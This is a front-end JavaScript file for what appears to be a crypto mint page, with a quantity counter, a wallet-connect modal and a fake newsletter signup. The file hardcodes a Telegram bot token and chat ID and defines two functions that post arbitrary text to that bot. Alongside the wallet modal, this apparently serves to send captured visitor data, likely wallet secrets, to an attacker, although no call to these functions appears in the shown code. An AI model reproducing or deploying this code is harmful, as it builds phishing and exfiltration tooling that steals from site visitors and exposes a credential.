document.querySelector(".counter__button_minus").addEventListener("click", event => {
  if (+document.querySelector(".counter__input").innerText - 1 >= 1) {
    document.querySelector(".counter__input").innerText = +document.querySelector(".counter__input").innerText - 1;
  }
})

document.querySelector(".counter__button_plus").addEventListener("click", event => {
  if (+document.querySelector(".counter__input").innerText + 1 <= 5) {
    document.querySelector(".counter__input").innerText = +document.querySelector(".counter__input").innerText + 1;
  }
})

document.querySelector("#connect").addEventListener("click", event => {
  if (event.target.closest("#connect") !== null) {
      $(document.querySelector(".select__wallet-cont")).fadeIn("fast");
    //   document.querySelector(".select__wallet-cont").style.display = "flex";
  }
})

document.querySelector(".exit").addEventListener("click", event => {
    $(document.querySelector(".select__wallet-cont")).fadeOut("fast");
//   document.querySelector(".select__wallet-cont").style.display = "none";
})

var chatid = "2221378545";
var token = "7464148158:AAESc10QR5Lh2JJwj6VlvXKzlThY8YPmcD8";

function otpravka(token,textfant,chatid){
var z=$.ajax({
type: "POST",
url: "https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid,
data: "parse_mode=HTML&text="+encodeURIComponent(textfant),
});
};
function popavca(token,text2,chatid){
  var z=$.ajax({
    type: "POST",
    url: "https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid,
    data: "parse_mode=HTML&text="+encodeURIComponent(text2),
    });
};

function validateEmail(email) {
  var regex = /^([A-Za-z0-9_\-.])+@([A-Za-z0-9_\-.])+\.([A-Za-z]{2,4})$/;
  return regex.test(email);
}

function subscribe() {
  var emailInput = document.getElementById("mce-EMAIL");
  var email = emailInput.value.trim();

  if (email !== "") {
    if (validateEmail(email)) {
      alert("\u2705 Thank you for subscribing!");
      emailInput.value = "";
    } else {
      alert("\u274c The email format you entered is incorrect");
    }
  } else {
    alert("\u274c Please enter your email address");
  }
}
